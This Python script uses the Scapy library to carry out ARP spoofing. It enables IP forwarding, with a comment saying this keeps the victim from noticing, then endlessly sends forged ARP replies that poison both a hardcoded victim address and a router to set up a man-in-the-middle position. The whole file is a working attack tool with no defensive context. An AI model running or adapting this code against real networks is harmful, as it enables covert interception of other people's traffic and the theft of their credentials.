#!/usr/bin/python3

# Scapy is a powerful Python library for manipulating and sending packets over a network. 
# It provides a variety of functions for creating, sending, and receiving packets, as well as for analyzing and manipulating network traffic.
import scapy.all as scapy

import subprocess 

def enable_forward():
    # Run Command to ENABLE forwarding (for the router, to make the target to not understand what's happening because internet continue to work)
    subprocess.call("sudo echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

def disable_forward():
    # Run Command to DISABLE forwarding
    subprocess.call("sudo echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)

def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalpacket = broadcast/arp_request
    answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    print(mac)
    return(mac)

def spoof_arp(target_ip, spoofed_ip):
    mac = get_target_mac(target_ip)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    scapy.send(packet, verbose=False)

def main():
    try:
        enable_forward()
        mytarget_router="10.150.150.2"
        mytarget_victim="10.150.150.143"
        while True:
            spoof_arp(mytarget_victim,mytarget_router)
            spoof_arp(mytarget_router,mytarget_victim)
    except KeyboardInterrupt:
        disable_forward()
        exit(0)


main()
